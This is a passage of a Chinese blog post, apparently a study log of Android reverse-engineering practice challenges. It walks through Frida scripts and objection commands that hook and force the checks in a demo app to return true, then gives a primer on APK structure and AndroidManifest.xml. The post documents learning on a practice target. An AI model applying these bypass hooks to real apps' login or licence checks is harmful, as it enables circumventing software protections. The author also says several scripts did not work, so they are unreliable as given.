<p>同样找到该按钮对应代码逻辑，获取数据，然后发送广播<code>sendBroadcast</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007162115632.png" alt="image-20231007162115632"></p>
<p>查看相关的<code>AndroidManifest.xml</code>，可以看到有个过滤，输入<code>android.is.very.fun</code>才能发送广播</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007162357541.png" alt="image-20231007162357541"></p>
<p>再查看广播对应代码，</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007162458278.png" alt="image-20231007162458278"></p>
<p>调用<code>NextContent</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007162542913.png" alt="image-20231007162542913"></p>
<p><code>onCreate</code>调用到<code>Change</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007162524862.png" alt="image-20231007162524862"></p>
<p>即该<code>change</code>就是以图片方式打开文件<code>timg_2.zip</code>显示出来，找到<code>apk</code>里面的<code>timg_2.zip</code>当作图片打开就能看见<code>flag</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007162709557.png" alt="image-20231007162709557"></p>
<p>此外分析的广播代码也能看到，输入<code>android.is.very.fun</code>也能展示图片</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007162815506.png" alt="image-20231007162815506"></p>
<p>此外由于<code>NextContent</code>是一个单独的<code>Activity</code>，可以直接使用<code>objection</code>拉起，也能看到<code>flag</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007163211614.png" alt="image-20231007163211614"></p>
<p>这里的<code>MainActivity2</code>也能使用这种方式拉起，相当于可以直接绕过关卡。</p>

        <h3 id="第三课、六层锁机"   >
          <a href="#第三课、六层锁机" class="heading-link"><i class="fas fa-link"></i></a><a href="#第三课、六层锁机" class="headerlink" title="第三课、六层锁机"></a>第三课、六层锁机</h3>
      
        <h4 id="第一关-获取函数返回值"   >
          <a href="#第一关-获取函数返回值" class="heading-link"><i class="fas fa-link"></i></a><a href="#第一关-获取函数返回值" class="headerlink" title="第一关 获取函数返回值"></a>第一关 获取函数返回值</h4>
      <p>打开<code>APK</code>，查看<code>AndroidManifest.xml</code>查找主<code>Activity</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231007173222240.png" alt="image-20231007173222240"></p>
<p>可以看到先从<code>LoginActivity</code>开始，查看一下对应代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231008090708333.png" alt="image-20231008090708333"></p>
<p>即讲<code>username</code>传入<code>a</code>函数进行处理，得到的结果需要与<code>passwd</code>相同。那么我们就可以<code>hook</code>住<code>a</code>函数，传入<code>username</code>，获取函数<code>a</code>的加密结果，然后放入<code>passwd</code>即可，这个可以直接通过<code>objection</code>操作</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objection -g com.example.androiddemo explore</span><br><span class="line">android hooking watch class_method com.example.androiddemo.Activity.LoginActivity.a --dump-args --dump-backtrace --dump-return</span><br></pre></td></tr></table></div></figure>

<p>即可获取到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231008093318794.png" alt="image-20231008093318794"></p>

        <h4 id="第二关-hook函数返回值"   >
          <a href="#第二关-hook函数返回值" class="heading-link"><i class="fas fa-link"></i></a><a href="#第二关-hook函数返回值" class="headerlink" title="第二关 hook函数返回值"></a>第二关 hook函数返回值</h4>
      <p>来到<code>BaseFridaActivity</code>，点击按钮调用到<code>onClick</code>，调用到<code>FridaActivity1</code>的<code>onCheck</code>，查看一下代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231008093628716.png" alt="image-20231008093628716"></p>
<p>放入<code>a</code>函数加密之后需要为<code>R4jSLLLLLLLLLLOrLE7/5B+Z6fsl65yj6BgC6YWz66gO6g2t65Pk6a+P65NK44NNROl0wNOLLLL=</code>，那么<code>hook</code>掉这个函数的返回值即可</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">one</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> FridaActivity1 = Java.use(<span class="string">&quot;com.example.androiddemo.Activity.FridaActivity1&quot;</span>);</span><br><span class="line">        FridaActivity1[<span class="string">&quot;a&quot;</span>].implementation = <span class="function"><span class="keyword">function</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;a called&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;R4jSLLLLLLLLLLOrLE7/5B+Z6fsl65yj6BgC6YWz66gO6g2t65Pk6a+P65NK44NNROl0wNOLLLL=&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">setImmediate(one)</span><br></pre></td></tr></table></div></figure>


        <h4 id="第三关-设置值，函数调用"   >
          <a href="#第三关-设置值，函数调用" class="heading-link"><i class="fas fa-link"></i></a><a href="#第三关-设置值，函数调用" class="headerlink" title="第三关 设置值，函数调用"></a>第三关 设置值，函数调用</h4>
      <p>来到下一关<code>FridaActivity2</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231008095316288.png" alt="image-20231008095316288"></p>
<p>那么<code>hook</code>一下<code>onCheck</code>函数，将两个属性置为<code>True</code>即可</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">two</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> FridaActivity2 = Java.use(<span class="string">&quot;com.example.androiddemo.Activity.FridaActivity2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        FridaActivity2[<span class="string">&quot;onCheck&quot;</span>].overload().implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;onCheck called&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.static_bool_var.value = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">this</span>.bool_var.value = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;static_bool_var:&quot;</span>,<span class="built_in">this</span>.static_bool_var);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;bool_var:&quot;</span>,<span class="built_in">this</span>.bool_var);</span><br><span class="line">            <span class="built_in">this</span>.onCheck();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>也可以不用<code>hook</code>掉<code>onCheck</code>函数，可以直接设置值的</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">two</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> FridaActivity2 = Java.use(<span class="string">&quot;com.example.androiddemo.Activity.FridaActivity2&quot;</span>);</span><br><span class="line">        FridaActivity2.static_bool_var.value = <span class="literal">true</span>;</span><br><span class="line">        Java.choose(<span class="string">&quot;com.example.androiddemo.Activity.FridaActivity2&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="function"><span class="keyword">function</span>(<span class="params">ins</span>)</span>&#123;</span><br><span class="line">                ins.bool_var.value = <span class="literal">true</span></span><br><span class="line">            &#125;,<span class="attr">onComplete</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>也可以调用接口</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">two</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> FridaActivity2 = Java.use(<span class="string">&quot;com.example.androiddemo.Activity.FridaActivity2&quot;</span>);</span><br><span class="line">        FridaActivity2.setStatic_bool_var();</span><br><span class="line">        Java.choose(<span class="string">&quot;com.example.androiddemo.Activity.FridaActivity2&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="function"><span class="keyword">function</span>(<span class="params">ins</span>)</span>&#123;</span><br><span class="line">                ins.setBool_var();</span><br><span class="line">            &#125;,<span class="attr">onComplete</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>关键知识点就是当属性或者函数需要借助于对象时，那么就需要先获取一个对象才能调用或者设置值。静态的使用<code>java.use</code>获取到类就可以直接使用。</p>

        <h4 id="第四关-函数名变量名相同"   >
          <a href="#第四关-函数名变量名相同" class="heading-link"><i class="fas fa-link"></i></a><a href="#第四关-函数名变量名相同" class="headerlink" title="第四关 函数名变量名相同"></a>第四关 函数名变量名相同</h4>
      <p>进入到<code>FridaActivity4</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231008102043873.png" alt="image-20231008102043873"></p>
<p>同样直接设置一下值即可，需要注意的时直接当变量属性和函数名称一样时，找对应的变量名称在前面需要加上<code>_</code>下划线，如下代码所示</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">three</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> FridaActivity3 = Java.use(<span class="string">&quot;com.example.androiddemo.Activity.FridaActivity3&quot;</span>);</span><br><span class="line">        FridaActivity3[<span class="string">&quot;onCheck&quot;</span>].overload().implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;onCheck called&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.static_bool_var.value = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">this</span>.bool_var.value = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">this</span>._same_name_bool_var.value = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;static_bool_var:&quot;</span>,<span class="built_in">this</span>.static_bool_var.value);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;bool_var:&quot;</span>,<span class="built_in">this</span>.bool_var.value);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;same_name_bool_var:&quot;</span>,<span class="built_in">this</span>._same_name_bool_var.value);</span><br><span class="line">            <span class="built_in">this</span>.onCheck();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(three)</span><br></pre></td></tr></table></div></figure>


        <h4 id="第五关-java反射，静态内部类"   >
          <a href="#第五关-java反射，静态内部类" class="heading-link"><i class="fas fa-link"></i></a><a href="#第五关-java反射，静态内部类" class="headerlink" title="第五关  java反射，静态内部类"></a>第五关  java反射，静态内部类</h4>
      <p>进入<code>FridaAacvitity4</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231008103403390.png" alt="image-20231008103403390"></p>
<p><code>hook</code>掉所有<code>check</code>函数返回<code>true</code>即可，这个我写出来不行，还是按照师傅的用<code>java</code>反射把，但是还是不行，不太会了，估计是哪边有点问题把。</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Activity4</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> class_name = <span class="string">&quot;com.example.androiddemo.Activity.FridaActivity4$InnerClasses&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> all_methods = Java.use(class_name).class.getDeclaredMethods();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;all_methods =&gt; &quot;</span>, all_methods);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; all_methods.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> method = all_methods[i];</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;single method =&gt; &quot;</span>, method);</span><br><span class="line">        <span class="keyword">var</span> substring = method.toString().substr(method.toString().indexOf(class_name) + class_name.length + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">var</span> finalMethodString = substring.substr(<span class="number">0</span>, substring.indexOf(<span class="string">&quot;(&quot;</span>));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;finalMethodString =&gt; &quot;</span>, finalMethodString);</span><br><span class="line">        Java.use(class_name)[finalMethodString].implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="literal">true</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="第六关-hook动态加载类"   >
          <a href="#第六关-hook动态加载类" class="heading-link"><i class="fas fa-link"></i></a><a href="#第六关-hook动态加载类" class="headerlink" title="第六关 hook动态加载类"></a>第六关 hook动态加载类</h4>
      <p>直接拉起下一关</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231008111303053.png" alt="image-20231008111303053"></p>
<p>主要还是在<code>getDynamicDexCheck</code>上</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231008112618340.png" alt="image-20231008112618340"></p>
<p>会加载一个类作为<code>DynamicDexCheck</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231008113622377.png" alt="image-20231008113622377"></p>
<p>随后调用这个类的<code>check</code>方法来判断</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231008113654890.png" alt="image-20231008113654890"></p>
<p>那么就需要<code>hook</code>动态加载这个类，然后<code>hook</code>里面的<code>check</code>方法即可。</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">five</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        Java.enumerateClassLoaders(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="function"><span class="keyword">function</span> (<span class="params">loader</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (loader.findClass(<span class="string">&quot;com.example.androiddemo.Dynamic.DynamicCheck&quot;</span>)) &#123;</span><br><span class="line">        </span><br><span class="line">                        Java.classFactory.loader = loader;</span><br><span class="line">        </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">&quot; continuing :&quot;</span> + error)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;EnumerateClassloader END&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        Java.use(<span class="string">&quot;com.example.androiddemo.Dynamic.DynamicCheck&quot;</span>).check.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>这里的<code>hook</code>不是很懂，先<code>mark</code></p>

        <h4 id="第七关"   >
          <a href="#第七关" class="heading-link"><i class="fas fa-link"></i></a><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h4>
      <p>进入<code>FridaActivity6</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231008113952312.png" alt="image-20231008113952312"></p>
<p><code>hook</code>掉对应类的<code>check</code>函数即可，这里总是不成功，很奇怪</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">six</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> Frida6Class0 = Java.use(<span class="string">&quot;com.example.androiddemo.Activity.Frida6.Frida6Class0&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> Frida6Class1 = Java.use(<span class="string">&quot;com.example.androiddemo.Activity.Frida6.Frida6Class1&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> Frida6Class2 = Java.use(<span class="string">&quot;com.example.androiddemo.Activity.Frida6.Frida6Class2&quot;</span>);</span><br><span class="line">        Frida6Class0[<span class="string">&quot;check&quot;</span>].implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;check called&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Frida6Class1[<span class="string">&quot;check&quot;</span>].implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Frida6Class2[<span class="string">&quot;check&quot;</span>].implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>




        <h1 id="基础知识"   >
          <a href="#基础知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1781093-1-1.html%EF%BC%8C%E8%BF%99%E6%98%AF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%8C%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E9%83%A8%E5%88%86%E3%80%82" >https://www.52pojie.cn/thread-1781093-1-1.html，这是基础知识，文件结构部分。</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="安卓文件结构"   >
          <a href="#安卓文件结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#安卓文件结构" class="headerlink" title="安卓文件结构"></a>安卓文件结构</h2>
      <ol>
<li><p><strong>res目录：</strong> 存放资源文件，包括icon，xml文件，目录存放资源文件，包括图片，字符串等等，APK的脸蛋由他的layout文件设计</p>
</li>
<li><p><strong>res/layout/:</strong> 存放被编译为屏幕布局（或屏幕的一部分）的XML文件</p>
</li>
<li><p><strong>res/values/:</strong> 存放可以被编译成很多类型的资源文件</p>
<ul>
<li><p>Bool：包含布尔值的 XML 资源，保存在 的 XML 文件： <code>res/values-small/bools.xml</code>。</p>
</li>
<li><p>color：包含颜色值（十六进制颜色）的 XML 资源，保存在 的 XML 文件： <code>res/values/colors.xml</code>。</p>
</li>
<li><p>dimen：包含尺寸值（及度量单位）的 XML 资源，保存在 的 XML 文件： <code>res/values/dimens.xml</code>。</p>
</li>
<li><p>id：提供应用资源和组件的唯一标识符的 XML 资源，保存在 的 XML 文件：<code>res/values/ids.xml</code>。</p>
</li>
<li><p>integer：包含整数值的 XML 资源，保存在 的 XML 文件：<code>res/values/integers.xml</code>。</p>
</li>
<li><p>integers：提供整数数组的 XML 资源，保存在 的 XML 文件： <code>res/values/integers.xml</code>。</p>
</li>
<li><p>array：提供 （可用于可绘制对象数组）的 XML 资源，保存在 的 XML 文件： <code>res/values/arrays.xml</code>。</p>
</li>
</ul>
</li>
<li><p><strong>AndroidManifest.xml文件：</strong> 应用程序配置文件，每个应用都必须定义和包含的，它描述了应用的名字、版本、权限、引用的库文件等信息。</p>
</li>
<li><p><strong>classes.dex文件：</strong> 传统 Class 文件是由一个 Java 源码文件生成的 .Class 文件，而 Android 是把所有 Class 文件进行合并优化，然后生成一个最终的 class.dex 文件。它包含 APK 的可执行代码，是分析 Android 软件时最常见的目标。由于dex文件很难看懂，可通过apktool反编译得到.smali文件，smali文件是对Dalvik虚拟机字节码的一种解释（也可以说是翻译），并非一种官方标准语言。通过对smali文件的解读可以获取源码的信息。</p>
</li>
<li><p><strong>resources.arsc文件：</strong> 二进制资源文件，包括字符串等，resources.arsc文件只包含资源的索引和映射关系，并不包含实际的资源内容。实际的资源内容存储在res文件夹中，按照资源类型和名称进行组织。当应用程序需要使用资源时，系统会根据resources.arsc文件中的索引信息找到对应的资源文件，并将其加载到内存中。</p>
</li>
<li><p><strong>smali:</strong> smali是将Android字节码用可阅读的字符串形式表现出来的一种语言,可以称之为Android字节码的反汇编语言。利用apktool或者Android Killer，反编classes.dex文件，就可以得到以smali为后缀的文件，这些smali文件就是Dalvik的寄存器语言。</p>
</li>
<li><p><strong>asssets目录：</strong>存放APK的静态资源文件，比如视频，音频，图片等</p>
</li>
<li><p><strong>lib目录：</strong>armeabi-v7a基本通用所有android设备，arm64-v8a只适用于64位的android设备，x86常见用于android模拟器，其目录下的.so文件是c或c++编译的动态链接库文件</p>
</li>
<li><p><strong>META-INF目录：</strong>保存应用的签名信息，签名信息可以验证APK文件的完整性，相当于APK的身份证(验证文件是否又被修改)</p>
</li>
<li><p><strong>Kotlin：</strong>代表该<code>APK</code>部分或者全部使用<code>Kotlin</code>进行开发</p>
</li>
</ol>

        <h3 id="AndroidManifest-xml"   >
          <a href="#AndroidManifest-xml" class="heading-link"><i class="fas fa-link"></i></a><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3>
      
        <h4 id="常见属性"   >
          <a href="#常见属性" class="heading-link"><i class="fas fa-link"></i></a><a href="#常见属性" class="headerlink" title="常见属性"></a>常见属性</h4>
      <p>AndroidManifest.xml文件是整个应用程序的信息描述文件，定义了应用程序中包含的Activity,Service,Content provider和BroadcastReceiver组件信息。每个应用程序在根目录下必须包含一个AndroidManifest.xml文件，且文件名不能修改。它描述了package中暴露的组件，他们各自的实现类，各种能被处理的数据和启动位置。</p>
<div class="table-container"><table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">定义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">versionCode</td>
<td align="left">版本号，主要用来更新，例如:12</td>
</tr>
<tr>
<td align="left">versionName</td>
<td align="left">版本名，给用户看的，例如:1.2</td>
</tr>
<tr>
<td align="left">package</td>
<td align="left">包名，例如：com.zj.52pj.demo</td>
</tr>
<tr>
<td align="left">uses-permission android:name=””</td>
<td align="left">应用权限，例如：android.permission.INTERNET 代表网络权限</td>
</tr>
<tr>
<td align="left">android:label=”@string/app_name”</td>
<td align="left">应用名称</td>
</tr>
<tr>
<td align="left">android:icon=”@mipmap/ic_launcher”</td>
<td align="left">应用图标路径</td>
</tr>
<tr>
<td align="left">android:debuggable=”true”</td>
<td align="left">应用是否开启debug权限</td>
</tr>
</tbody></table></div>
<p>有时候可以反编译之后，在该文件中找到某些权限，删除不必要的权限获取，这样就安全多了。</p>

        <h4 id="标签"   >
          <a href="#标签" class="heading-link"><i class="fas fa-link"></i></a><a href="#标签" class="headerlink" title="标签"></a>标签</h4>
      <ul>
<li>manifest标签</li>
</ul>
<p>manifest标签是AndroidManifest.xml文件的根标签，它包含了应用程序的基本信息，如包名、版本号、SDK版本、应用程序的名称和图标等等。</p>
<ul>
<li>application标签</li>
</ul>
<p>application标签是应用程序的主要标签，它包含了应用程序的所有组件，如Activity(活动)、Service(服务)、Broadcast Receiver(广播接收器)、Content Provider(内容提供者)等等。在application标签中，也可以设置应用程序的全局属性，如主题、权限等等。</p>
<ul>
<li>activity标签</li>
</ul>
<p>activity标签定义了一个Activity组件，它包含了Activity的基本信息，如Activity的名称、图标、主题、启动模式等等。在activity标签中，还可以定义Activity的布局、Intent过滤器等等。</p>
<ul>
<li>service标签</li>
</ul>
<p>service标签定义了一个Service组件，它包含了Service的基本信息，如Service的名称、图标、启动模式等等。在service标签中，还可以定义Service的Intent过滤器等等。</p>
<ul>
<li>receiver标签</li>
</ul>
<p>receiver标签定义了一个BroadcastReceiver组件，它包含了BroadcastReceiver的基本信息，如BroadcastReceiver的名称、图标、权限等等。在receiver标签中，还可以定义BroadcastReceiver的Intent过滤器等等。</p>
<ul>
<li>provider标签</li>
</ul>
<p>provider标签定义了一个Content Provider组件，它包含了Content Provider的基本信息，如Content Provider的名称、图标、权限等等。在provider标签中，还可以定义Content Provider的URI和Mime Type等等。</p>
<ul>
<li>uses-permission标签</li>
</ul>
<p>uses-permission标签定义了应用程序需要的权限，如访问网络、读取SD卡等等。在应用程序安装时，系统会提示用户授权这些权限。</p>
<ul>
<li>uses-feature标签</li>
</ul>
<p>uses-feature标签定义了应用程序需要的硬件或软件特性，如摄像头、GPS等等。在应用程序安装时，系统会检查设备是否支持这些特性。</p>

        <h2 id="安卓四大组件"   >
          <a href="#安卓四大组件" class="heading-link"><i class="fas fa-link"></i></a><a href="#安卓四大组件" class="headerlink" title="安卓四大组件"></a>安卓四大组件</h2>
      <div class="table-container"><table>
<thead>
<tr>
<th align="left">组件</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Activity(活动)</td>
